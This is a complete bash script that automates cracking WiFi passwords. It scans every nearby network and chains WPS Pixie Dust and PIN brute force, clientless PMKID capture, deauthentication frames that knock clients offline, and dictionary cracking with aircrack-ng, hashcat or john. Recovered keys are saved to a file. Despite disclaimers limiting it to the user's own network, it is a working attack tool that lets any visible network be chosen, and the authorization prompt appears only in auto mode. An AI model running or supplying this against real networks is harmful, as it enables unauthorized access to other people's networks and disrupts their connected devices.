#!/usr/bin/env bash
# pwcrak.sh — Authorized WiFi security assessment of your OWN network
#
# Attack chain, easiest first:
#   1. WPS Pixie Dust (reaver + pixiewps)  — seconds, no brute force
#   2. WPS PIN attack (reaver)             — no dictionary needed
#   3. PMKID capture (hcxdumptool)         — clientless, no deauth
#   4. Handshake capture (airodump/aireplay) + dictionary (aircrack-ng/hashcat)
#
# Usage:
#   sudo ./pwcrak.sh                       # interactive menu
#   sudo ./pwcrak.sh -a                    # auto: run all attacks, easiest first
#   sudo ./pwcrak.sh -i wlan0 -w rockyou.txt
#   sudo ./pwcrak.sh -b AA:BB:CC:DD:EE:FF  # skip scan if BSSID already known
#
# IMPORTANT: must run on LINUX with an adapter that supports monitor mode +
# injection (e.g. Alfa AWUS036NHA). macOS/Windows built-in WiFi cannot do this.
# Only use on networks you own or are clearly authorized to test.

set -u
export LC_ALL=C

RED=$'\e[31m'; GREEN=$'\e[32m'; YELLOW=$'\e[33m'; CYAN=$'\e[36m'; NC=$'\e[0m'
info()    { echo "${CYAN}[*]${NC} $*"; }
ok()      { echo "${GREEN}[+]${NC} $*"; }
warn()    { echo "${YELLOW}[!]${NC} $*"; }
fail()    { echo "${RED}[✗]${NC} $*"; }
die()     { fail "$*"; exit 1; }

# timestamped debug log — always written to $WORK/debug.log, mirrored to console with -v
dbg() {
    local line="[$(date '+%H:%M:%S')] $*"
    [[ -z "${WORK:-}" ]] || printf '%s\n' "$line" >> "$WORK/debug.log"
    if (( VERBOSE )); then echo "${CYAN}[dbg]${NC} $*"; fi
}

# ---------- defaults ----------
IFACE=""
MON=""
TARGET_BSSID=""
TARGET_CH=""
TARGET_ESSID=""
TARGET_ENC=""
AUTO=0
SCAN_TIME=30
PMKID_TIME=60
HANDSHAKE_WAIT=90
DEAUTH_COUNT=5
WORDLIST=""
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK=""
MON_STARTED=0
NM_STATE=""
WPA_STATE=""
SUCCESS=0
VERBOSE=0
ORIG_ARGS="$*"

usage() {
    cat <<'USAGE'
pwcrak.sh — authorized WiFi security assessment of YOUR OWN network (Debian/Kali)

Attack chain, easiest first:
  1. WPS Pixie Dust (reaver + pixiewps)   — seconds, no brute force
  2. WPS PIN attack (reaver)              — no dictionary needed
  3. PMKID capture (hcxdumptool/hcxtools)  — clientless, no deauth
  4. Handshake capture + dictionary (aircrack-ng / hashcat / john)

Requires Linux + USB WiFi adapter with monitor mode & injection
(e.g. Alfa AWUS036NHA). macOS/Windows built-in WiFi cannot do this.

Usage:
  sudo ./pwcrak.sh                    interactive menu, scans ALL networks
  sudo ./pwcrak.sh -a                 auto: all attacks, easiest first
  sudo ./pwcrak.sh -i wlan0           pick adapter
  sudo ./pwcrak.sh -w /path/list.txt  custom wordlist
  sudo ./pwcrak.sh -b AA:BB:CC:DD:EE:FF [-e "MySSID"]   skip scan if known
  sudo ./pwcrak.sh -t 60              scan seconds per pass
  sudo ./pwcrak.sh -v                 verbose: also mirror debug log to console

Only run against networks you own or are explicitly authorized to test.
USAGE
    exit 0
}

while getopts ":i:w:b:c:e:at:vh" opt; do
    case $opt in
        i) IFACE="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        b) TARGET_BSSID="$OPTARG" ;;
        c) TARGET_CH="$OPTARG" ;;
        e) TARGET_ESSID="$OPTARG" ;;
        a) AUTO=1 ;;
        t) SCAN_TIME="$OPTARG" ;;
        v) VERBOSE=1 ;;
        h) usage ;;
        *) usage; exit 1 ;;
    esac
done

cleanup() {
    dbg "cleanup: MON='${MON:-}' MON_STARTED=$MON_STARTED NM_STATE='${NM_STATE:-}' SUCCESS=$SUCCESS"
    if [[ -n "${MON:-}" && "$MON_STARTED" -eq 1 ]]; then
        airmon-ng stop "$MON" >/dev/null 2>&1
    fi
    if [[ -n "$NM_STATE" ]] ; then
        [[ "$NM_STATE" == "active" ]] && info "Restarting NetworkManager" && systemctl start NetworkManager 2>/dev/null
        [[ "$WPA_STATE" == "active" ]] && systemctl start wpa_supplicant 2>/dev/null
        rfkill unblock all 2>/dev/null
    fi
}
trap cleanup EXIT INT TERM

# ---------- environment checks ----------
[[ $EUID -ne 0 ]] && die "Run as root: sudo $0"
[[ "$(uname -s)" == "Linux" ]] || die "This script needs Linux (macOS/Windows built-in WiFi cannot do monitor mode + injection). Use Kali/live USB/VM with a USB WiFi adapter passed through."

check_deps() {
    local missing=() optional=()
    for t in airmon-ng airodump-ng aireplay-ng aircrack-ng reaver pixiewps wash hcxdumptool hcxpcapngtool iw timeout; do
        command -v "$t" >/dev/null || missing+=("$t")
    done
    for t in hashcat john; do
        command -v "$t" >/dev/null || optional+=("$t")
    done
    if (( ${#missing[@]} )); then
        fail "Missing required tools: ${missing[*]}"
        echo "  Debian/Kali:  sudo apt-get install aircrack-ng reaver pixiewps hcxdumptool hcxtools"
        echo "  Arch:         sudo pacman -S aircrack-ng reaver pixiewps hcxdumptool hcxtools"
        exit 1
    fi
    (( ${#optional[@]} )) && warn "Optional GPU/CPU crackers not found (hashcat, john): dictionary attacks will use aircrack-ng (slower)." || true
}

# ---------- wordlist ----------
resolve_wordlist() {
    if [[ -z "$WORDLIST" ]]; then
        if [[ -s "$SCRIPT_DIR/passwords.txt" ]]; then
            WORDLIST="$SCRIPT_DIR/passwords.txt"
        elif [[ -s /usr/share/wordlists/rockyou.txt ]]; then
            WORDLIST=/usr/share/wordlists/rockyou.txt
        elif [[ -s /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ]]; then
            WORDLIST=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
        elif [[ -s /usr/share/wordlists/rockyou.txt.gz ]]; then
            WORDLIST=/usr/share/wordlists/rockyou.txt.gz
        elif command -v zstd >/dev/null 2>&1 && [[ -s /usr/share/wordlists/rockyou.txt.zst ]]; then
            WORDLIST=/usr/share/wordlists/rockyou.txt.zst
        else
            WORDLIST=""
        fi
    fi
    if [[ -z "$WORDLIST" ]]; then
        warn "No wordlist found. Dictionary attack will be skipped (WPS attacks don't need one)."
    elif [[ ! -s "$WORDLIST" ]]; then
        die "Wordlist '$WORDLIST' not found or empty."
    else
        ok "Wordlist: $WORDLIST"
    fi
}

# aircrack-ng can read .gz / .zst wordlists directly; john/hashcat cannot
wordlist_for() {
    case "$WORDLIST" in
        *.gz) echo "$WORDLIST" ;;          # aircrack-ng reads .gz natively
        *.zst) prepare_wordlist_plain ;;   # aircrack's zstd support varies by version
        *) echo "$WORDLIST" ;;
    esac
}

# ---------- setup ----------
prepare_workdir() {
    WORK="$(pwd)/pwcrak_work_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$WORK"
    ok "Working dir: $WORK"
    info "Debug log: $WORK/debug.log (mirror to console with -v)"
}

prepare_wordlist_plain() {
    # hashcat/john need an uncompressed file
    if [[ "$WORDLIST" == *.gz ]]; then
        gunzip -c "$WORDLIST" > "$WORK/plain_wordlist.txt" && echo "$WORK/plain_wordlist.txt"
    elif [[ "$WORDLIST" == *.zst ]]; then
        zstd -dc "$WORDLIST" > "$WORK/plain_wordlist.txt" && echo "$WORK/plain_wordlist.txt"
    else
        echo "$WORDLIST"
    fi
}

kill_services() {
    NM_STATE=$(systemctl is-active NetworkManager 2>/dev/null || echo "")
    WPA_STATE=$(systemctl is-active wpa_supplicant 2>/dev/null || echo "")
    dbg "services before monitor: NetworkManager='${NM_STATE}' wpa_supplicant='${WPA_STATE}'"
    if [[ -n "$NM_STATE" || -n "$WPA_STATE" ]]; then
        info "Stopping network managers so monitor mode works cleanly..."
        airmon-ng check kill >/dev/null 2>&1
    fi
}

start_monitor() {
    if [[ -z "$IFACE" ]]; then
        info "Available wireless interfaces:"
        iw dev 2>/dev/null | awk '/Interface/{print "    "$2}' | sort -u
        read -r -p "$(echo "${CYAN}[*]${NC} Interface to use: ")" IFACE
    fi
    [[ -d "/sys/class/net/$IFACE" ]] || die "Interface '$IFACE' not found."

    kill_services

    info "Enabling monitor mode on $IFACE..."
    airmon-ng start "$IFACE" >/dev/null 2>&1

    if [[ -d "/sys/class/net/${IFACE}mon" ]]; then
        MON="${IFACE}mon"
    else
        MON=$(iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i}' | head -n1)
    fi
    [[ -n "$MON" ]] || die "Could not enter monitor mode. Your adapter may not support injection."
    MON_STARTED=1
    ok "Monitor interface: $MON"
    dbg "monitor up: $MON (phy iface $IFACE)"
}

stop_monitor() {
    if [[ -n "$MON" && "$MON_STARTED" -eq 1 ]]; then
        info "Restoring managed mode..."
        airmon-ng stop "$MON" >/dev/null 2>&1
        MON_STARTED=0
        dbg "monitor stopped: $MON"
    fi
}

# ---------- target discovery ----------
run_wps_sweep() {
    if ! command -v wash >/dev/null 2>&1; then
        warn "wash not found — WPS tagging unavailable."
        return 0
    fi
    info "Sweeping for WPS-capable networks (20s)..."
    timeout -k 5 20 wash -i "$MON" >> "$WORK/wash.log" 2>/dev/null
    dbg "wash sweep rc=$? (log: $WORK/wash.log)"
    awk 'tolower($1) ~ /^[0-9a-f:]{17}$/ {print tolower($1), (tolower($5)=="yes" ? "wps-locked" : "wps")}' \
        "$WORK/wash.log" | sort -u | awk '!seen[$1]++' > "$WORK/wps_tags"
    dbg "wps tags: $(wc -l < "$WORK/wps_tags" 2>/dev/null || echo 0) network(s)"
}

wps_tag_of() {
    local t
    t=$(awk -v b="$(echo "$1" | tr 'A-F' 'a-f')" '$1==b {print $2; exit}' "$WORK/wps_tags" 2>/dev/null)
    echo "${t:--}"
}

lookup_target_from_scan() {
    local csv="$1"
    TARGET_CH=$(awk -F',' -v b="$TARGET_BSSID" '
        $1 ~ /^[0-9A-Fa-f:]{17}$/ && tolower($1)==tolower(b) {c=$4; gsub(/^[ \t]+/,"",c); print c; exit}' "$csv")
    [[ -n "$TARGET_CH" ]] || return 1
    if [[ -z "$TARGET_ESSID" ]]; then
        TARGET_ESSID=$(awk -F',' -v b="$TARGET_BSSID" '
            $1 ~ /^[0-9A-Fa-f:]{17}$/ && tolower($1)==tolower(b) {
                e=$14; for (i=15; i<NF; i++) e=e","$i;
                gsub(/^[ \t]+|[ \t]+$/,"",e); gsub(/^"|"$/,"",e); print e; exit}' "$csv")
    fi
    TARGET_ENC=$(awk -F',' -v b="$TARGET_BSSID" '
        $1 ~ /^[0-9A-Fa-f:]{17}$/ && tolower($1)==tolower(b) {e=$6; gsub(/^[ \t]+|[ \t]+$/,"",e); print e; exit}' "$csv")
    ok "Target: ${TARGET_ESSID:--}  BSSID: $TARGET_BSSID  CH: $TARGET_CH  ENC: ${TARGET_ENC:-?}"
    dbg "target resolved from scan: essid='${TARGET_ESSID:-}' ch=$TARGET_CH enc='${TARGET_ENC:-}'"
    if [[ -z "$TARGET_ESSID" || "$TARGET_ESSID" == *"<length:"* ]]; then
        warn "Hidden/blank SSID — dictionary cracking needs the real ESSID (pass -e \"Name\"); WPS/PMKID still work."
    fi
    if [[ "$TARGET_ENC" == *WPA3* && "$TARGET_ENC" != *WPA2* ]]; then
        warn "Target shows WPA3-only ($TARGET_ENC): PMKID and standard dictionary attacks do not apply; WPS may still work."
    fi
    return 0
}

show_targets() {
    echo
    echo "    BSSID              PWR  CH   ENCRYPTION      WPS        ESSID"
    echo "    -----------------  ---  ---  --------------  ---------  ------------------"
    awk -F',' '
        $1 ~ /^[0-9A-Fa-f:]{17}$/ && NF >= 15 && !seen[$1]++ {
            ess=$14;
            if (NF > 15) { for (i=15; i<NF; i++) ess=ess","$i }
            gsub(/\./,"",$9); gsub(/^[ \t]+/,"",$9);
            gsub(/^[ \t]+|[ \t]+$/,"",$1); gsub(/^[ \t]+|[ \t]+$/,"",$4);
            gsub(/^[ \t]+|[ \t]+$/,"",$6);
            gsub(/^[ \t]+|[ \t]+$/,"",ess); gsub(/^"|"$/,"",ess);
            print $1 "\t" $9 "\t" $4 "\t" $6 "\t" ess;
        }' "$WORK/targets.csv" | while IFS=$'\t' read -r b pwr ch enc ess; do
            [[ "$ess" == *"<length:"* ]] && ess="(hidden, $ess)"
            printf "    %-17s %-3s %-4s %-14s  %-9s  %s\n" "$b" "$pwr" "$ch" "$enc" "$(wps_tag_of "$b")" "$ess"
        done
    echo
}

scan_targets() {
    if [[ -n "$TARGET_BSSID" && -n "$TARGET_CH" ]]; then
        ok "Skipping scan (-b and -c given)."
        return 0
    fi
    local round=1 pick csv
    : > "$WORK/targets.csv"
    while :; do
        info "Pass $round: scanning ${SCAN_TIME}s across 2.4/5 GHz (hopping all channels)..."
        timeout -k 5 "$SCAN_TIME" airodump-ng -w "$WORK/scan_r${round}" --output-format csv "$MON" >/dev/null 2>&1
        local scan_rc=$?
        dbg "pass $round: airodump-ng rc=$scan_rc (124=timeout ok, 137=force-killed, 0=clean exit)"
        if (( scan_rc == 137 )); then
            warn "airodump-ng ignored SIGTERM and was force-killed — driver wedge suspected (typical with Realtek 88xx dkms); keeping partial capture."
        fi
        csv=$(ls -t "$WORK"/scan_r${round}-0*.csv 2>/dev/null | head -n1)
        if [[ -n "$csv" ]]; then
            local new_aps
            new_aps=$(awk '/^ *Station MAC,/{exit} {print}' "$csv" | grep -cE '^[0-9A-Fa-f]{2}:')
            awk '/^ *Station MAC,/{exit} {print}' "$csv" | cat - "$WORK/targets.csv" > "$WORK/targets.new"
            mv "$WORK/targets.new" "$WORK/targets.csv"
            info "Pass $round saw $new_aps network(s)."
            dbg "pass $round: csv=$csv aps=$new_aps"
        else
            warn "Pass $round captured nothing (driver/channel issue? run longer with -t)."
        fi
        if [[ "$TARGET_BSSID" =~ ^[0-9A-Fa-f:]{17}$ ]] && lookup_target_from_scan "$WORK/targets.csv"; then
            return 0
        fi
        if [[ -n "$TARGET_BSSID" ]]; then
            if (( round >= 3 )); then
                stop_monitor
                die "BSSID $TARGET_BSSID not seen after $round passes — move closer, raise -t, or verify the BSSID."
            fi
            round=$((round+1))
            continue
        fi
        if [[ -s "$WORK/targets.csv" ]]; then
            run_wps_sweep
            show_targets
        else
            warn "No networks seen yet."
        fi
        if ! read -r -p "$(echo "${CYAN}[*]${NC} BSSID of the network to test, [r]escan, or [q]uit: ")" pick; then
            stop_monitor
            die "No interactive input available (stdin closed) — aborting instead of looping on rescans."
        fi
        dbg "operator input: '${pick}'"
        case "$pick" in
            r|R) round=$((round+1)); continue ;;
            q|Q) stop_monitor; die "Aborted by user." ;;
            "") continue ;;
            *)
                if [[ "$pick" =~ ^[0-9A-Fa-f:]{17}$ ]]; then
                    TARGET_BSSID="$pick"
                else
                    warn "Not a MAC address (expected AA:BB:CC:DD:EE:FF)."
                fi
                ;;
        esac
        if [[ "$TARGET_BSSID" =~ ^[0-9A-Fa-f:]{17}$ ]]; then
            if lookup_target_from_scan "$WORK/targets.csv"; then
                return 0
            fi
            warn "BSSID not in the current list — press r to rescan and look again."
            TARGET_BSSID=""
        fi
    done
}

confirm_target() {
    if [[ "$AUTO" -eq 1 ]]; then
        echo
        warn "You are about to attack: ${TARGET_ESSID:-$TARGET_BSSID} ($TARGET_BSSID)"
        read -r -p "$(echo "${YELLOW}[!]${NC} Confirm this is YOUR network or you have written authorization [y/N]: ")" okyn
        [[ "$okyn" == "y" || "$okyn" == "Y" ]] || die "Aborted by user."
    fi
}

# ---------- WPS ----------
check_wps_presence() {
    info "Checking if target supports WPS (wash, 15s)..."
    local out
    out=$(timeout -k 5 15 wash -i "$MON" -c "$TARGET_CH" 2>/dev/null)
    local wash_rc=$?
    dbg "wash target check (ch $TARGET_CH) rc=$wash_rc, output lines: $(echo "$out" | grep -c .)"
    if echo "$out" | grep -qiw "$TARGET_BSSID"; then
        ok "WPS enabled — Pixie Dust may apply."
        return 0
    fi
    warn "WPS not detected (router may have it disabled) — skipping to clientless/handshake attacks."
    return 1
}

parse_reaver_log() {
    local log="$1"
    local pin psk
    pin=$(grep -aoiE "WPS pin:? ?'*[0-9]{8}'*" "$log" | tail -n1 | grep -aoE "[0-9]{8}" | head -n1)
    psk=$(grep -aoiE "WPA PSK: ?'[^']+'" "$log" | tail -n1 | sed "s/.*'//;s/'$//")
    if [[ -n "$pin" || -n "$psk" ]]; then
        echo
        echo "==================================================================="
        echo "  TARGET      : ${TARGET_ESSID:-$TARGET_BSSID}  ($TARGET_BSSID)"
        [[ -n "$pin" ]] && echo "  WPS PIN     : $pin"
        [[ -n "$psk" ]] && echo "  WPA PASSWORD: $psk"
        echo "==================================================================="
        {
            echo "ESSID=${TARGET_ESSID:-$TARGET_BSSID} BSSID=$TARGET_BSSID"
            [[ -n "$pin" ]] && echo "WPS_PIN=$pin"
            [[ -n "$psk" ]] && echo "PSK=$psk"
        } >> "$WORK/CRACKED.txt"
        ok "Saved to $WORK/CRACKED.txt"
        SUCCESS=1
        return 0
    fi
    return 1
}

attack_wps_pixie() {
    info "=== WPS Pixie Dust attack (usually takes seconds) ==="
    local log="$WORK/pixie.log"
    timeout -k 5 300 reaver -i "$MON" -b "$TARGET_BSSID" -c "$TARGET_CH" -vv -K 1 > "$log" 2>&1
    dbg "reaver pixie rc=$? (log: $log)"
    tail -n 20 "$log"
    if parse_reaver_log "$log"; then
        ok "Pixie Dust succeeded — WPS vulnerable router."
        return 0
    fi
    warn "Pixie Dust did not yield a PIN."
    return 1
}

attack_wps_pin() {
    warn "=== WPS PIN brute force — this can take hours; Ctrl-C anytime ==="
    local log="$WORK/pin.log"
    reaver -i "$MON" -b "$TARGET_BSSID" -c "$TARGET_CH" -vv -d 1 --fail-wait=5 > "$log" 2>&1 &
    local pid=$!
    dbg "reaver pin started: pid=$pid (log: $log; polling every 10s for PIN/PSK)"
    while kill -0 "$pid" 2>/dev/null; do
        if parse_reaver_log "$log"; then
            kill "$pid" 2>/dev/null; wait "$pid" 2>/dev/null
            return 0
        fi
        sleep 10
    done
    parse_reaver_log "$log"
}

# ---------- PMKID (clientless) ----------
attack_pmkid() {
    info "=== PMKID attack (clientless, no deauth, ${PMKID_TIME}s) ==="
    echo "$TARGET_BSSID" > "$WORK/target_filter"
    local ok_run=1
    timeout -k 5 "$PMKID_TIME" hcxdumptool -i "$MON" -o "$WORK/pmkid.pcapng" \
        --filterlist_ap="$WORK/target_filter" --filtermode=2 --enable_status=1 \
        2>&1 | tee "$WORK/pmkid_status.log" || ok_run=0
    dbg "hcxdumptool (filtered) finished, ok_run=$ok_run (status: $WORK/pmkid_status.log)"
    if [[ "$ok_run" -eq 0 ]]; then
        warn "filterlist unsupported by this hcxdumptool build — retrying unfiltered."
        timeout -k 5 "$PMKID_TIME" hcxdumptool -i "$MON" -o "$WORK/pmkid.pcapng" --enable_status=1 2>&1 | tail -n 5
    fi
    hcxpcapngtool -o "$WORK/pmkid.22000" "$WORK/pmkid.pcapng" 2>/dev/null
    dbg "pmkid.22000 extracted: $(stat -c %s "$WORK/pmkid.22000" 2>/dev/null || echo 0) byte(s)"
    if [[ -s "$WORK/pmkid.22000" ]]; then
        ok "PMKID captured — cracking wordlist now."
        crack_hash_22000 "$WORK/pmkid.22000"
    else
        warn "No PMKID obtained (router may not allow it, or WPA3-only)."
    fi
}

# ---------- handshake + dictionary ----------
attack_handshake() {
    info "=== Handshake capture + dictionary attack ==="
    info "Deauth of $DEAUTH_COUNT frames will temporarily disconnect YOUR OWN clients."
    rm -f "$WORK"/hs-01.cap
    ( airodump-ng -w "$WORK/hs" --output-format pcap -c "$TARGET_CH" --bssid "$TARGET_BSSID" "$MON" \
        > "$WORK/aidump.log" 2>&1 ) &
    local aid=$!
    dbg "handshake capture: airodump pid=$aid, ch $TARGET_CH, bssid $TARGET_BSSID, wait ${HANDSHAKE_WAIT}s (log: $WORK/aidump.log)"
    sleep 5
    info "Sending $DEAUTH_COUNT deauth frames..."
    aireplay-ng -0 "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$MON" >/dev/null 2>&1

    local waited=0 handshake=0
    while (( waited < HANDSHAKE_WAIT )); do
        if grep -qi "handshake" "$WORK/aidump.log" 2>/dev/null; then handshake=1; break; fi
        sleep 1; waited=$((waited+1))
    done
    if (( handshake )); then
        ok "Handshake captured."
    else
        warn "No handshake yet — sending one more deauth round..."
        aireplay-ng -0 "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$MON" >/dev/null 2>&1
        local more=0
        while (( more < 30 )); do
            grep -qi "handshake" "$WORK/aidump.log" 2>/dev/null && { handshake=1; break; }
            sleep 1; more=$((more+1))
        done
        (( handshake )) && ok "Handshake captured." || warn "Still no handshake."
    fi
    kill "$aid" 2>/dev/null; wait "$aid" 2>/dev/null

    local cap
    cap=$(ls -t "$WORK"/hs-0*.cap 2>/dev/null | head -n1)
    dbg "capture files present: $(ls "$WORK"/hs-0*.cap 2>/dev/null | tr '\n' ' ')"
    [[ -n "$cap" ]] || { warn "No capture file written."; return 1; }

    hcxpcapngtool -o "$WORK/handshake.22000" "$cap" 2>/dev/null
    if [[ -s "$WORK/handshake.22000" ]]; then
        crack_hash_22000 "$WORK/handshake.22000"
    fi
    if [[ "$SUCCESS" -eq 0 ]]; then
        info "Cracking capture with aircrack-ng..."
        local out wl_air essid_args=()
        wl_air=$(wordlist_for)
        dbg "aircrack-ng -b $TARGET_BSSID -w $wl_air $cap (log: $WORK/aircrack.log)"
        if [[ -n "$TARGET_ESSID" && "$TARGET_ESSID" != *"<length:"* ]]; then
            essid_args=(-e "$TARGET_ESSID")
        fi
        out=$(aircrack-ng -b "$TARGET_BSSID" "${essid_args[@]}" -w "$wl_air" -l "$WORK/found.key" "$cap" 2>&1 | tee "$WORK/aircrack.log")
        dbg "aircrack finished; found.key: $(stat -c %s "$WORK/found.key" 2>/dev/null || echo 0) byte(s)"
        echo "$out" | tail -n 5
        if [[ -s "$WORK/found.key" ]]; then
            local key
            key=$(<"$WORK/found.key")
            echo "==================================================================="
            echo "  TARGET      : ${TARGET_ESSID:-$TARGET_BSSID}  ($TARGET_BSSID)"
            echo "  WPA PASSWORD: $key"
            echo "==================================================================="
            echo "ESSID=${TARGET_ESSID:-$TARGET_BSSID} BSSID=$TARGET_BSSID" >> "$WORK/CRACKED.txt"
            echo "PSK=$key" >> "$WORK/CRACKED.txt"
            ok "Saved to $WORK/CRACKED.txt"
            SUCCESS=1
        else
            warn "Not found in wordlist."
        fi
    fi
}

crack_hash_22000() {
    local hashfile="$1"
    local wl
    wl=$(prepare_wordlist_plain) || return 1
    [[ -n "$wl" && -s "$wl" ]] || { warn "No wordlist for hash cracking."; return 1; }
    dbg "cracking $hashfile with wordlist $wl ($(wc -l < "$wl" 2>/dev/null || echo '?') candidates)"

    if command -v hashcat >/dev/null 2>&1; then
        info "hashcat -m 22000 (stop with Ctrl-C)..."
        hashcat -m 22000 -a 0 --force --potfile-path="$WORK/hashcat.pot" \
            "$hashfile" "$wl" -o "$WORK/hashcat.out" 2>&1 | tail -n 5
        dbg "hashcat finished (pot: $WORK/hashcat.pot, out: $WORK/hashcat.out)"
        if [[ -s "$WORK/hashcat.out" ]]; then
            local psk
            psk=$(tr ':' '\n' < "$WORK/hashcat.out" | tail -n1)
            echo "==================================================================="
            echo "  TARGET      : ${TARGET_ESSID:-$TARGET_BSSID}  ($TARGET_BSSID)"
            echo "  WPA PASSWORD: $psk"
            echo "==================================================================="
            echo "ESSID=${TARGET_ESSID:-$TARGET_BSSID} BSSID=$TARGET_BSSID" >> "$WORK/CRACKED.txt"
            echo "PSK=$psk" >> "$WORK/CRACKED.txt"
            ok "Saved to $WORK/CRACKED.txt"
            SUCCESS=1
            return 0
        fi
        warn "hashcat found nothing or is unavailable on this hardware."
    fi
    if [[ "$SUCCESS" -eq 0 ]] && command -v john >/dev/null 2>&1; then
        info "john the ripper fallback..."
        john --wordlist="$wl" --pot="$WORK/john.pot" "$hashfile" 2>&1 | tail -n 3
        dbg "john finished (pot: $WORK/john.pot)"
        local shown
        shown=$(john --show "$hashfile" --pot="$WORK/john.pot" 2>/dev/null)
        if [[ -n "$shown" ]]; then
            echo "  Crack result (john): $shown"
            echo "JOHN=$shown" >> "$WORK/CRACKED.txt"
            SUCCESS=1
        fi
    fi
    return 0
}

# ---------- flow ----------
report_summary() {
    echo
    info "================ SUMMARY ================"
    if [[ "$SUCCESS" -eq 1 ]]; then
        ok "Password recovered — see $WORK/CRACKED.txt"
    else
        warn "No password recovered this run."
        info "Suggested next steps:"
        echo "   - Longer/rockyou-grade wordlist (aircrack-ng -w rockyou.txt)" 
        echo "   - Try mdk4-based attacks or check for other misconfigurations (WEP, open networks)"
        echo "   - Check router admin page for WPS toggle — if on, Pixie Dust usually works"
    fi
    info "Captures/logs kept in: $WORK"
}

run_all() {
    if check_wps_presence; then
        attack_wps_pixie
        [[ "$SUCCESS" -eq 0 ]] && attack_wps_pin
    fi
    [[ "$SUCCESS" -eq 0 ]] && attack_pmkid
    [[ "$SUCCESS" -eq 0 ]] && attack_handshake
    report_summary
}

main_menu() {
    echo
    echo "  1) Run all attacks — easiest first (recommended)"
    echo "  2) WPS Pixie Dust only"
    echo "  3) WPS PIN brute force only"
    echo "  4) PMKID (clientless) + dictionary"
    echo "  5) Handshake + dictionary"
    echo "  6) Quit"
    read -r -p "$(echo "${CYAN}[*]${NC} Choose: ")" choice
    dbg "menu choice: '${choice}'"
    case $choice in
        1) run_all ;;
        2) attack_wps_pixie; report_summary ;;
        3) attack_wps_pin; report_summary ;;
        4) attack_pmkid; report_summary ;;
        5) attack_handshake; report_summary ;;
        *) exit 0 ;;
    esac
}

main() {
    check_deps
    resolve_wordlist
    prepare_workdir
    dbg "start: $0 $ORIG_ARGS"
    dbg "wordlist=${WORDLIST:-none} auto=$AUTO iface='${IFACE:-auto-prompt}' scan_time=$SCAN_TIME pmkid_time=$PMKID_TIME"
    start_monitor
    scan_targets
    confirm_target
    if (( AUTO )); then
        run_all
    else
        main_menu
    fi
    stop_monitor
}

main